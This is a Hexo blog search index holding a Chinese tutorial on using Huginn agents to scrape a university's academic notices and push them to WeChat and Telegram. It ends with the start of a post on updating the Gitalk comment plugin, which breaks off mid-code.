<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小想法 | 利用Huginn&amp;TelegramBot实现教务通知自动爬取与推送</title>
      <link href="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/"/>
      <url>/2020/02/11/Idea_Huginn_AAONoticeAutoPush/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久在服务器上装好了Huginn（<a href="https://miaotony.xyz/2020/02/03/Server_Huginn/">详见这里：基于Docker搭建Huginn</a>）。</p><p>这几天折腾了一下，尝试着用它来爬点东西玩一下<em>（bushi</em></p><p>想了一下，平时会关注<strong>教务的通知</strong>，每次都要访问教务网站，虽然说也不是很麻烦，但我想要一个自动推送的工具。或者说，不需要我主动去看有没有新通知，而是有新通知公告了就直接推过来。（类似于Webhook？ 😃</p><p>说到这个，其实之前在 RSSHub 上看到过一个，不过现在好像失效了。考虑到目前没有折腾 RSSHub 的打算，干脆就用 Huginn 自己弄一个好了。</p><p>说干就干了啦。</p><p>哦对了，最终的效果大概这样——</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><hr><h2 id="通知的爬取"><a href="#通知的爬取" class="headerlink" title="通知的爬取"></a>通知的爬取</h2><p>与其说专门打造一个教务通知公告的爬取，不如说记录一下 Huginn 的基本使用方法。</p><p>说实话，<strong>Huginn 的资料真的少</strong>，感觉国内都没有多少介绍这个的，于是遇到了不少问题经常不知道怎么办emmm。</p><h3 id="一些小介绍"><a href="#一些小介绍" class="headerlink" title="一些小介绍"></a>一些小介绍</h3><p>打开你喜欢的浏览器，进入 Huginn（默认为 <code>127.0.0.1:3000</code>），最上方有如下几个选项。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/huginn_intro.png" alt="标题栏"></p><p>其中Agents就是你的一个个小兵，他们可以互相协作，按照流水线依次完成各自的使命。</p><p>Scenarios 就是这些小兵的集合，或者说是某种场景，官方描述是</p><blockquote><p>Scenarios are named groups of Agents.  Scenarios allow you to organize your agents, and to import and export sets of Agents to share.</p></blockquote><p>比如说你有A、B、C三个Agent，他们共同完成一个任务，你就可以把他们集合起来作为一个Scenario。</p><p>Events 是小兵们收集来的信息。</p><p>Credentials 用来记录一些常量，或者说是环境变量。</p><blockquote><p>Credentials are used to store values used by many Agents. Examples might include “twitter_consumer_secret”, “user_full_name”, or “user_birthday”.      </p></blockquote><p>在使用时，就可以像 <code> {% credential Meow_API %} </code> 这样来引用，其中 <code>Meow_API</code> 在 Credentials 中进行定义。</p><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p>Huginn 里有很多种 Agent，这里用到的可以说是最常用的 <strong>Website Agent</strong> 和 <strong>Post Agent</strong> 。</p><p>更多的可以参考官方 Wiki 的介绍，在<a href="https://github.com/huginn/huginn/wiki/Agent-Types-&amp;-Descriptions" target="_blank" rel="noopener">这里</a>。</p><p>这个项目的思路就是</p><ul><li>访问教务网站，爬取通知公告栏的标题及链接</li><li>根据得到的链接，访问相应网址，获得通知具体内容</li><li>将得到的信息打包，根据 Server Chan 和 Telegram Bot API 的格式发送即可</li></ul><h3 id="创建获取信息的-Agent"><a href="#创建获取信息的-Agent" class="headerlink" title="创建获取信息的 Agent"></a>创建获取信息的 Agent</h3><p><strong>Crawler_AAO #1 Get Notice URLs</strong></p><p>选择 Website Agent，界面如下：</p><p> <img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WebsiteAgent.png" alt="Website Agent"></p><p><code>Name</code>自己取个喜欢的名字。</p><p><code>Schedule</code>可以指定运行的周期。如果列表里没有合适的选项的话，可以选择Never，再另外创建一个<strong>Scheduler Agent</strong>，以<a href="http://en.wikipedia.org/wiki/Cron" target="_blank" rel="noopener">cron</a>格式自己写一个，然后在<code>Controllers</code>里指向这个Scheduler Agent。</p><p><code>Keep events</code>可以定义获得Events后保留的时间，过期后自动会删除之前的Events。每次爬取后，获得新的数据才作为一个event，否则不会触发一个新的event，可以说在一定程度上起到了去重的作用。（当然如果还有重复的话，可以后面再加一个<strong>De-duplication Agent</strong>）</p><p>如果数据量过大的话最好不要设成<code>Forever</code>。但是要确保在下一个 Agent 能够在 Event 过期之前获取到数据。</p><p><code>Sources</code>就是上一个Agent，<code>Receivers</code>就是下一个Agent。勾选<code>Propagate immediately</code>的话，上一个Agent获取到数据后则立即执行这个Agent，否则会间隔一分钟再执行。（开启会加重CPU负担）</p><p><code>Scenarios</code>就是那个Agents的集合啦。</p><p><code>Options</code>里是具体的配置，是JSON的格式，可以参考右边的提示来进行设置。</p><p>怎么说好呢，其实简单的参数右边是有了，但是实际配置的时候还是有不少问题。看官方文档吧emmm</p><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">https://huginnio.herokuapp.com/agents</a> 这里有关于Agents各自API的详细介绍。</p><hr><p>下面是<code>options</code>的具体介绍。</p><p>Website Agent可以爬取来自<code>url</code>/<code>url_from_event</code>/<code>data_from_event</code>的信息。</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>可以<code>xml</code>, <code>html</code>, <code>json</code>, or <code>text</code>。相应的类型有各自的介绍，这里是HTML网页，就用<code>html</code>好了。</p><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>可以是<code>all</code>, <code>on_change</code>, or <code>merge</code>。If you specify <code>merge</code> for the <code>mode</code> option, Huginn will retain the old payload and update it with new values. </p><p>即如果选择<code>merge</code>，则会与之前的信息合并，这个在获取教务通知的具体内容时会用到，之后不再赘述。这里只需要在出现新通知的时候触发，所以用<code>on_change</code>。</p><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p><code>extract</code>里就是要解析的内容，可以用a CSS selector in <code>css</code> or an XPath expression in <code>xpath</code>. （如果<code>type</code>里选<code>text</code>则可以用<code>regexp</code>正则匹配，<em>然而如果要html提取后再正则匹配就需要再来一个Agent，感觉有点蠢emmm如果有更好的办法欢迎来和我交流一下哈</em>）</p><ul><li><p><strong>要注意的是：</strong>这个解析的内容是根据url浏览后<strong>直接获得的页面，没有加载文本之外的任何内容，没有经过JavaScript渲染等等</strong>。或者说就是你<code>F12</code>在<code>Network</code>里看到的页面加载出来的document或xhr之类得到的response。<em>（这个是在利用 Huginn 爬取其他网站的时候发现的）</em></p></li><li><p>如果需要爬取JavaScript加载的网页，可以使用 <strong>Phantom Js Cloud Agent</strong>，这个需要在<a href="https://phantomjscloud.com/" target="_blank" rel="noopener">PhantomJs Cloud</a>申请一个API，有一定的免费额度。这个Agent会返回页面的相应信息，还可以具体设置输出JSON、截图等等。</p></li></ul><p><code>extract</code>里以JSON格式写要解析的对象，后面就会返回 相应名字作为Key，相应的值作为Value 的JSON结果。</p><p>CSS可以这样找↓，直接<strong>复制CSS路径</strong>，再进行缩略处理。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/css_selector.png" alt="复制css路径"></p><p>比如这里复制出来是</p><pre class=" language-css"><code class="language-css">html body div<span class="token number">.</span>container-fluid div<span class="token number">.</span>main-content<span class="token number">.</span>clearfix div<span class="token number">.</span>left-content div<span class="token number">.</span>notice-announcement div#index_notice_content<span class="token number">.</span>tab-content div<span class="token number">.</span>tab-pane<span class="token number">.</span>active ul<span class="token number">.</span>tab-pane-ul li div<span class="token number">.</span>inform-content a</code></pre><p>然后<strong>处理 css path</strong>。</p><p>原始路径过长，<strong>删去不带 <code>.</code> 或 <code>#</code> 的节点（节点间以空格“ ”分割），并删去每个节点在 <code>.</code> 或 <code>#</code>前的第一个标签</strong>，得到：</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>container-fluid <span class="token number">.</span>main-content<span class="token number">.</span>clearfix <span class="token number">.</span>left-content <span class="token number">.</span>notice-announcement #index_notice_content<span class="token number">.</span>tab-content <span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><p>前半部分对节点定位用处不大，继续缩略，于是得到</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><blockquote><p><strong>非常规情况处理</strong>： </p><p>a. 有些路径中的<strong>节点带空格</strong>，如<code>&lt;div class="packery-item article"&gt;</code>,路径中的空格由<code>.</code>代替，截取为<code>.packery-item.article</code> </p><p>b. 当抓取<strong>多种 css path 规则</strong>时，用逗号<code>,</code>分割</p><pre class=" language-css"><code class="language-css"><span class="token string">"css"</span><span class="token punctuation">:</span> <span class="token string">".focus-title .current a , .stress h2 a"</span>,</code></pre></blockquote><p><code>value</code>用来提取标签中的属性，可以利用<a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>。（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>Xpath Functions是可以进行嵌套来用的<del>（套娃</del>（x</p><p>这里用了 <code>@href</code>来提取链接，用<code>string(.)</code>来提取这个css路径下的字符串，用 <code>normalize-space</code>函数来去除多余的空格。得到的JSON表达式如下。</p><pre class=" language-json"><code class="language-json"><span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>除了上面这些，还可以设置<strong>User Agent</strong>，以及一个用<strong>Liquid模板语言编写的模板<code>template</code></strong>等等。</p><blockquote><p>Liquid markup language. Safe, customer facing template language for flexible web apps.  </p></blockquote><p>Liquid官方仓库：<a href="https://github.com/Shopify/liquid" target="_blank" rel="noopener">https://github.com/Shopify/liquid</a>。这里有关于Liquid语法的中文介绍：<a href="https://liquid.bootcss.com/" target="_blank" rel="noopener">https://liquid.bootcss.com/</a>。</p><p>Liquid也是可以嵌套的，利用管道 <code>|</code> 可以将处理后的结果送到下一个filter。</p><p>除了Liquid自带的filter，Huginn还提供了一些自己的用法，详见官方文档 <a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a>。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/liquid_huginn.png" alt="Liquid Templating"></p><p>在这里，由于得到的 href 是相对地址（如 <code>/2020/0208/c11066a193409/page.htm</code>），为了得到绝对地址，在<code>template</code>中利用 <code> {{ url | to_uri: _response_.url }}</code> 进行处理。</p><p><em>（别说了，这几天找遍了XPath function和Liquid用法）</em></p><hr><p>设好之后可以点击<strong>Dry Run</strong>来试试，看看运行的结果，再做进一步的修改。</p><p>于是最终得到的<code>Crawler_AAO #1 Get Notice URLs</code> Options 如下。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://aao.nuaa.edu.cn/"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"on_change"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"time"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-data"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(.)"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url | to_uri<span class="token operator">:</span> _response_.url <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h3 id="创建获取内容的-Agent"><a href="#创建获取内容的-Agent" class="headerlink" title="创建获取内容的 Agent"></a>创建获取内容的 Agent</h3><p><strong>Crawler_AAO #2 Get Notice Contents</strong></p><p>一样是Website Agent。</p><p><code>Sources</code>选择第一步创建的Agent，即 <strong>Crawler_AAO #1 Get Notice URLs</strong>。</p><p><code>Options</code>中的<code>url</code>就来自第一个Agent，于是可以用Liquid中的<code> {{url}} </code>。</p><p><code>mode</code> 为 <code>merge</code>，合并之前的信息作为最终的输出。当然也可以利用模板<code>template</code>以及Liquid来调用之前获取的对象。</p><p>这里再利用Liquid中的<code>strip_html</code>用法，将所有的html标签去除，最终得到的<code>content</code>就只剩包含<code>\n</code>的字符串了。（之前试了XPath Function里的<code>normalize-space</code>函数，发现所有文字都连一起了，<del>丑死了emmm</del></p><p>最终得到如下的Options。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"{{url}}"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".wp_articlecontent"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"."</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"content"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> content | strip_html <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到微信"><a href="#将通知推送到微信" class="headerlink" title="将通知推送到微信"></a>将通知推送到微信</h2><p><strong>Crawler_AAO #3 WeChat Push</strong></p><p>这里利用Server Chan提供的微信模板消息推送服务，之前也写过一篇：<a href="https://miaotony.xyz/2019/03/07/Idea_PushBearAPI_WeChatPush/">小想法 | 基于PushBear API实现微信消息推送</a>。这次再来用一下呢。</p><p>现在 PushBear 一对多的推送需要绑定认证过的服务号了，但是个人的推送还是可以用的。</p><p>这次用的就是Huginn里的<strong>Post Agent</strong>啦。</p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>这个Agent的<code>method</code>可以是<code>get</code>, <code>post</code>, <code>put</code>, <code>patch</code>, and <code>delete</code>，基本的都能实现。</p><p>Server Chan那边说是用GET，但好像POST也行。</p><h3 id="post-url"><a href="#post-url" class="headerlink" title="post_url"></a>post_url</h3><p>填写Server Chan的API地址，<code> https://sc.ftqq.com/{% credential YourServerChanAPI %}.send? </code></p><p>这里把API保存到了Credentials里，直接用Liquid模板调用就好了。</p><h3 id="content-type"><a href="#content-type" class="headerlink" title="content_type"></a>content_type</h3><p>这里用form（<code>application/x-www-form-urlencoded</code>）。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>API接口有两个参数，标题<code>text</code>（必须），描述<code>desp</code>（可选），支持Markdown语法。</p><p>这里自己定义就好了啦~ 怎么开心怎么来嘻嘻嘻。</p><pre class=" language-json"><code class="language-json"><span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"【{{title}}】"</span><span class="token punctuation">,</span>    <span class="token property">"desp"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span>% line_break %<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> content | replace<span class="token operator">:</span> \<span class="token string">"\n\", \"\n\n\" }}"</span><span class="token punctuation">}</span></code></pre><p><strong>要注意的是：</strong>如果直接在它的模板里修改参数信息，则<strong>带有<code>\</code>的会自动转义为<code>\\</code></strong>！</p><p>因此直接写<code>\n</code>不可行，而要点击<strong>Toggle View</strong>然后直接写<code>\n</code>。或者也可以调用 Huginn 提供的方法 <code> {% line_break %} </code> 。</p><p>另一个问题，<strong>在Server Chan中<code>\n\n</code>才能换行</strong>，于是利用 Liquid 的<code> {{ content | replace: \"\n\", \"\n\n\" }} </code> 把<code>\n</code>给替换成<code>\n\n</code>。（需要直接写，不能直接在参数的框里改。</p><p>还要注意保存后如果再次修改则<code>\n</code>又会自动变为<code>\\n</code>，注意留意。建议保存之前先<strong>Dry Run</strong>试试。</p><h3 id="emit-events"><a href="#emit-events" class="headerlink" title="emit_events"></a>emit_events</h3><p>如果设为<code>true</code>，则会返回一个Event，可以再加一个Agent来判断是否发送成功。</p><p>例如某次发送成功后得到的Event如下，其中的body部分为返回的数据。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token property">"{\"errno\":0,\"errmsg\":\"success\",\"dataset\"</span><span class="token operator">:</span>\<span class="token string">"done\"}"</span><span class="token punctuation">,</span>  <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"Server"</span><span class="token operator">:</span> <span class="token string">"nginx"</span><span class="token punctuation">,</span>    <span class="token property">"Date"</span><span class="token operator">:</span> <span class="token string">"Tue, 10 Feb 2020 09:00:51 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span>    <span class="token property">"Connection"</span><span class="token operator">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token property">"Expires"</span><span class="token operator">:</span> <span class="token string">"Thu, 01 Jan 1970 00:00:01 GMT"</span><span class="token punctuation">,</span>    <span class="token property">"Cache-Control"</span><span class="token operator">:</span> <span class="token string">"no-cache, must-revalidate"</span><span class="token punctuation">,</span>    <span class="token property">"Pragma"</span><span class="token operator">:</span> <span class="token string">"no-cache"</span><span class="token punctuation">,</span>    <span class="token property">"Via"</span><span class="token operator">:</span> <span class="token string">"100167"</span><span class="token punctuation">,</span>    <span class="token property">"Set-Cookie"</span><span class="token operator">:</span> <span class="token string">"PHPSESSID=xxxxxxxxxx; expires=Wed, 11-Feb-2020 09:00:51 GMT; path=/; domain=sc.ftqq.com; HttpOnly"</span><span class="token punctuation">,</span>    <span class="token property">"Content-Length"</span><span class="token operator">:</span> <span class="token number">47</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="将通知推送到Telegram-Channel"><a href="#将通知推送到Telegram-Channel" class="headerlink" title="将通知推送到Telegram Channel"></a>将通知推送到Telegram Channel</h2><p><strong>Crawler_AAO #3 Telegram Channel Push</strong></p><p>同样使用的是<strong>Post Agent</strong>。<em>（看了一下，Telegram Agent好像不大灵活，而且还需要先有一个Event Formatting Agent，让Event中包含either a <code>text</code>, <code>photo</code>, <code>audio</code>, <code>document</code> or <code>video</code> key.）</em></p><p>昨天研究了好久Telegram Bot，看了看<a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">官方API文档</a>，发现没有想象中的那么困难233333。</p><p>首先 @BotFather 注册一个TGBot，得到token。</p><p>这里没有设置Webhook，只需要用到<code>sendMessage</code>方法就好了。</p><h3 id="post-url-1"><a href="#post-url-1" class="headerlink" title="post_url"></a>post_url</h3><p>URL为<code>https://api.telegram.org/bot&lt;token&gt;/sendMessage</code>，将<code>&lt;token&gt;</code>部分换成自己的Bot token，可以保存到Credentials里。</p><p>如<code>https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage</code></p><p>可以先用 PostMan 测试一下。</p><p>别忘了<code>bot</code>……<em>（是我了</em></p><h3 id="method-1"><a href="#method-1" class="headerlink" title="method"></a>method</h3><p>POST or GET</p><h3 id="content-type-1"><a href="#content-type-1" class="headerlink" title="content_type"></a>content_type</h3><ul><li><a href="https://en.wikipedia.org/wiki/Query_string" target="_blank" rel="noopener">URL query string</a></li><li>application/x-www-form-urlencoded</li><li>application/json (except for uploading files)</li><li>multipart/form-data (use to upload files)</li></ul><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>参数列表如下</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TGAPI.png" alt="API参数"></p><p>也可以使用Markdown语法。（还别说，真挺好</p><hr><p>其实还有一个问题，我部署Huginn的服务器是在墙内的，于是还需要想办法转发出去。</p><p>具体自己想办法了啦。</p><p><del>（折腾了半天用 <em>heroku</em> 搭了一个自己凑合着用</del></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实最初是想看看Huginn怎么用的，折腾过程中还去看了Liquid模板语法，XPath Functions用法。</p><p>推送到微信的前几天就弄好了，昨天想看看TG Bot怎么玩，于是研究了一下Bot API，顺便又写了个推送到TG Channel的。</p><p><strong>最终的效果——</strong></p><p>每隔一段时间，Huginn 就会派出一个Agent小兵，去看一看教务有没有新的通知公告。</p><p>噢来了呀！Agent带回来了一个新的Event，快把它推给主人吧！</p><p>Ding~</p><p>微信来了一条新信息。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p>TG的Channel那边也来了。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><p>嗯，这个感觉就很棒，朴实无华，且枯燥。（然而并没有钱</p><p>emmm 24号开始就要网上上课了。</p><hr><p><strong>以上内容仅供学习研究，请勿用于非法用途。</strong></p><p>噢对了，TG Channel的邀请链接在这个域名里找嘻嘻嘻——</p><p><strong><em>_tg_aaonotice.miaotony.xyz</em></strong></p><br><hr><p>就在我部署这篇文章的时候，发现所有的 非代码块内的 Liquid语言全部被hexo认为是代码了emmm</p><p>我忘记hexo也用了Liquid了。。（感觉蠢死了</p><p>于是把需要在所有的 <code>{{xxx}}</code>和<code>{% xxx %}</code>外面套一层 <code>{% raw %} ...  {% endraw %}</code><br>如果要写上面这个<code>raw</code>，需要写两个（类似于转义）。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw.png" alt="raw"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw2.png" alt="raw2"></p><hr><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><p><a href="https://github.com/huginn/huginn/wiki" target="_blank" rel="noopener">Huginn Wiki</a></p></li><li><p><a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a></p></li><li><p><a href="https://liquid.bootcss.com/" target="_blank" rel="noopener">Liquid 中文文档</a></p></li><li><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">Huginn Agent 文档</a></p></li><li><p><a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">Telegram Bot官方API文档</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/46216545" target="_blank" rel="noopener">RSS 进阶篇：Huginn - 真·为任意网页定制 RSS 源（PhantomJs 抓取）</a></p></li><li><p><a href="https://blog.wangjiegulu.com/2018/11/16/douban_high_movie_huginn_telegram/" target="_blank" rel="noopener">Huginn 实现自动通过 Telegram 推送豆瓣高分电影</a></p></li><li><p><a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>etc.</p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Projects </tag>
            
            <tag> Huginn </tag>
            
            <tag> Telegram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog折腾记 | 升级Gitalk评论插件以解决EmailBombs</title>
      <link href="/2020/02/07/Blog_UpdateGitalk/"/>
      <url>/2020/02/07/Blog_UpdateGitalk/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这几天我的邮箱被 GitHub 轰炸了emmm。</p><p>具体大概是这样的——</p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail.png" alt="GitHubEmail"></p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail2.png" alt="GitHubEmail2"></p><p>说好的</p><blockquote><p>Depending on your API usage, we’ll be sending you this email reminder at most once every 3 days.</p></blockquote><p>然而从2月4日开始每天都有一堆……</p><p><strong>所以这到底是什么回事呢？</strong></p><p>我一想，用到这个 API 的只有我博客的 Gitalk 评论插件。目前我博客的评论都放在了GitHub项目的issue里，每篇文章浏览到下面的时候会自动加载评论，这时候就会向GitHub的API发请求从而获取相应数据。</p><br><hr><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>于是去 gitalk 的官方仓库看了看，果然2月4日当天就有人提issue了，看来不少人 Email Bombs 了23333（摊手。</p><p><a href="https://github.com/gitalk/gitalk/issues/343" target="_blank" rel="noopener">https://github.com/gitalk/gitalk/issues/343</a></p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue.png" alt="issue"></p><p>很多大佬对这个问题进行了讨论，当然也有不少 <code>+1 Mark</code>之类的在旁观。</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>2月4日这样，@geektutu 给出了一个 <strong>Use read-only personal access token to replace clientID &amp; clientSecret</strong> 的方案，并提了PR，详见：<a href="https://github.com/gitalk/gitalk/pull/344" target="_blank" rel="noopener">#344</a>。这个PR在2月6日merge了。</p><p>根据他的建议，首先需要更新 <code>gitalk.min.js</code>文件，如果想获得更多的API使用量，需要在 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">accessToken</a> 里生成一个只读的token，而后修改 Gitalk 模板里的配置，新增<code>accessToken</code>项。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> gitalk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gitalk</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  clientID<span class="token punctuation">:</span> <span class="token string">'GitHub Application Client ID'</span><span class="token punctuation">,</span>  clientSecret<span class="token punctuation">:</span> <span 